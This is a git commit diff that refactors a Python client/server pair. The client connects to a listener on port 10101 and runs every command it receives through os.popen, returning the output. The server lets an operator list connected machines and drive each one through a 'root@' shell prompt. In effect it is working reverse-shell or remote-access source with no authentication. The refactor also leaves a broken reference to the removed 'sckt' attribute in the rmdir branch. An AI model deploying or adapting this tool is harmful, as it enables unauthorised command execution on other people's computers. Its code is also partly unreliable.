66c9edb7bb05b499b4908bc81549f068b6b261d4
Christian Villa <iamchristianv@gmail.com>
2018-06-15 18:30:15 -0700

    Refactor client and server files

--- client.py
+++ client.py
@@ -3,53 +3,48 @@
 import os
 import socket
 
-
 class Client(object):
-    host = ""
-    sckt = None
+   
+    def __init__(self):
+        self.ip = "127.0.0.1"
+        self.port = 10101
+        self.socket = socket.socket()
+        self.data_size = 4096
+        self.data_format = "utf-8"
 
-    # initiates the client with the IP address of the server and creates a socket
-    def __init__(self, host="127.0.0.1"):
-        self.host = host
-        self.sckt = socket.socket()
-
-    # connects the socket to the server and prepares the client to receive commands from the server
     def start(self):
-        self.sckt.connect((self.host, 10101))
+        self.configure_socket()
         self.receive_commands()
 
-    # interprets the commands from the server and performs them on the client itself
+    
+    def configure_socket(self):
+        self.socket.connect((self.ip, self.port))
+
+
     def receive_commands(self):
         while True:
-            data = self.sckt.recv(4096)
-            # server sends '?' to determine whether the connection with the client is still active
-            if data.decode("utf-8") == "?":
-                self.sckt.send("!")
-            elif data[:2].decode("utf-8") == "cd":
-                os.chdir(data[3:].decode("utf-8"))
+            data = self.socket.recv(self.data_size)
+            command = data.decode(self.data_format)
+            if command == "?":
+                self.socket.send("!")
+            elif command[:2] == "cd":
+                os.chdir(command[3:])
+                self.socket.send(" ")
+            elif command[:5] == "mkdir":
+                os.mkdir(command[6:])
+                self.socket.send(" ")
+            elif command[:5] == "rmdir":
+                os.rmdir(command[6:])
                 self.sckt.send(" ")
-            elif data[:5].decode("utf-8") == "mkdir":
-                os.mkdir(data[6:].decode("utf-8"))
-                self.sckt.send(" ")
-            elif data[:5].decode("utf-8") == "rmdir":
-                os.rmdir(data[6:].decode("utf-8"))
-                self.sckt.send(" ")
-            elif len(data) > 0:
+            elif len(command) > 0:
                 try:
-                    # commands from the server are run as a subprocess of the client
-                    process = os.popen(data.decode("utf-8"))
-                    # output from the commands are returned to be displayed by the server
+                    process = os.popen(command)
                     output = str(process.read())
-                    self.sckt.send(output + " ")
+                    self.socket.send(output + " ")
                 except OSError as message:
-                    self.sckt.send(str(message) + " ")
-        self.sckt.close()
+                    self.socket.send(str(message) + " ")
+        self.socket.close()
 
 
-def main():
-    client = Client()
-    client.start()
+Client().start()
 
-
-if __name__ == "__main__":
-    main()
--- server.py
+++ server.py
@@ -4,157 +4,108 @@ import socket
 import threading
 import sys
 
-
 class Server(object):
-    sckt = None
-    addresses = []
-    connections = []
-    connected = False
 
-    # creates a socket, waits for connections from clients, and initiates the main menu for the user
+    def __init__(self):
+        self.ip = "127.0.0.1"
+        self.port = 10101
+        self.socket = socket.socket()
+        self.data_size = 4096
+        self.addresses_to_connections = {}
+
+    
     def start(self):
-        self.create_socket()
-        self.create_threads()
+        self.configure_socket()
+        self.send_commands()
 
-    # creates a socket to accept connections from clients
-    def create_socket(self):
-        try:
-            self.sckt = socket.socket()
-            self.sckt.bind(("", 10101))
-            self.sckt.listen(5)
-        except socket.error:
-            print("\nUnable to configure socket at the moment.")
-            print("Please try again in a few minutes.\n")
-            sys.exit()
 
-    # creates two threads to simultaneously accept connections from clients and manage input from the user
-    def create_threads(self):
-        for number in range(2):
-            thread = None
-            if number == 0:
-                thread = threading.Thread(target=self.accept_connections)
-            elif number == 1:
-                thread = threading.Thread(target=self.show_main_menu())
-            thread.daemon = True
-            thread.start()
+    def configure_socket(self):
+        self.socket.bind((self.ip, self.port))
+        self.socket.listen(5)
 
-    # accepts connections from clients and adds them to the lists of connections and addresses
+    
+    def send_commands(self):
+        thread = threading.Thread(target=self.accept_connections)
+        thread.daemon = True
+        thread.start()
+        thread = threading.Thread(target=self.accept_commands())
+        thread.daemon = True
+        thread.start()       
+
+
     def accept_connections(self):
-        try:
-            connection, address = self.sckt.accept()
-            self.connections.append(connection)
-            self.addresses.append(address)
-            # checks if the output will interrupt the user managing a connection with a client
-            if not self.connected:
-                print("\n- connection established with IP address " + address[0])
-                print("- select 1 to see more information on all connections\n")
-                print("Select an option: ")
+        try: 
+            connection, address = self.socket.accept()
+            self.addresses_to_connections[address[0]] = connection            
         except socket.error:
-            print("\n- unable to accept a connection\n")
+            print(socket.error)
+    
 
-    # manages input from the user for the main menu
-    def show_main_menu(self):
-        menu_selections = ("\n1) Show Connections", "2) Manage Connection", "3) Quit Program")
+    def accept_commands(self):    
         while True:
-            for menu_selection in menu_selections:
-                print(menu_selection)
-            selection = raw_input("\nSelect an option: ")
-            if not selection.isdigit():
-                print("- selection not a number")
-            elif int(selection) == 1:
+            command = raw_input("root@" + self.ip + "$ ")
+            if command == "show":
                 self.show_connections()
-            elif int(selection) == 2:
-                self.select_connection()
-            elif int(selection) == 3:
+            elif command[:6] == "manage":
+                address = command[7:]
+                self.manage_connection(address)
+            elif command == "exit":
+                self.close_connections()
                 break
+            elif command == "help":
+                print("show             - show active connections")
+                print("manage [address] - manage an active connection")
+                print("exit             - exit an active connection")
             else:
-                print("- selection not available")
-        self.close_connections()
+                print("command not recognized")
+    
 
-    # shows a list of available connections to the user
     def show_connections(self):
-        print("\n----------- Connections -----------")
-        for index, address in enumerate(self.addresses):
+        inactive_addresses = []
+        for address, connection in self.addresses_to_connections.items():
             try:
-                # sends a message to each connection in the list to determine which are still available
-                self.connections[index].send("?")
-                self.connections[index].recv(4096)
+                connection.send("?")
+                connection.recv(self.data_size)
             except socket.error:
-                # if an exception occurs, then the connection is no longer available
-                self.remove_connection(index)
+                inactive_addresses.append(address)
                 continue
-            print("\nID: " + str(index) + (" " * 5) + "IP: " + address[0] + (" " * 5) + "PORT: " + str(address[1]))
-        if len(self.connections) == 0:
+        for inactive_address in inactive_addresses:
+            del self.addresses_to_connections[inactive_address]
+        print("----------- Connections -----------")        
+        if len(self.addresses_to_connections) == 0:
             print("\n           No Connections")
+        for address in self.addresses_to_connections.keys():
+            print("\n" + address)
         print("\n-----------------------------------")
 
-    # lets the user to select a connection to manage from a list of connections
-    def select_connection(self):
-        if len(self.connections) == 0:
-            print("- no connections available")
-            return
-        while True:
-            self.show_connections()
-            print("\nEnter 'back' to return to main menu")
-            selection = raw_input("\nSelect a connection ID: ")
-            if selection.lower() == "back":
-                break
-            if not self.error_check_selection(selection):
-                self.establish_connection(int(selection))
-                break
 
-    # checks whether the user entered an appropriate ID based on available connections
-    def error_check_selection(self, argument):
-        if not argument.isdigit():
-            print("- " + argument + " is not a number")
-            return True
-        index = int(argument)
-        if index >= len(self.connections):
-            print("- connection " + str(index) + " is not available")
-            return True
-        elif self.connections[index] is None:
-            print("- connection " + str(index) + " is not available")
-            self.remove_connection(index)
-            return True
-        return False
-
-    # directly connects the user to the connection selected
-    def establish_connection(self, index):
-        self.connected = True
-        print("\nEnter 'done' to exit the connection\n")
-        while True:
-            # commands entered by the user are processed by the client
-            command = raw_input(self.addresses[index][0] + "> ")
-            if command == "done":
-                break
-            elif len(command) > 0:
-                try:
-                    # commands are sent to the client, and the output is returned to the server
-                    self.connections[index].send(command)
-                    response = str(self.connections[index].recv(4096))
-                    print(response)
-                except socket.error:
-                    # if an exception occurs, then the client closed the connection while the user was managing it
-                    print("- lost connection")
+    def manage_connection(self, address):
+        if address is None:
+            print("address not provided")
+        if not address in self.addresses_to_connections:
+            print("address not recognized")
+        else:
+            connection = self.addresses_to_connections[address]
+            print("\nEnter 'exit' to leave the connection\n")
+            while True:
+                command = raw_input("root@" + address + "$ ")
+                if command == "exit":
                     break
-        self.connected = False
+                elif len(command) > 0:
+                    try:
+                        connection.send(command)
+                        response = str(connection.recv(4096))
+                        print(response)
+                    except socket.error:
+                        print("lost connection")
+                        break
 
-    # removes a connection by index from the lists of available connections and addresses
-    def remove_connection(self, index):
-        del self.addresses[index]
-        del self.connections[index]
 
-    # closes all available connections and the socket once the user has finished
     def close_connections(self):
-        for connection in self.connections:
+        for connection in self.addresses_to_connections.values():
             connection.close()
-        self.sckt.close()
+        self.socket.close()
 
 
-def main():
-    server = Server()
-    server.start()
+Server().start()
 
-
-if __name__ == "__main__":
-    main()
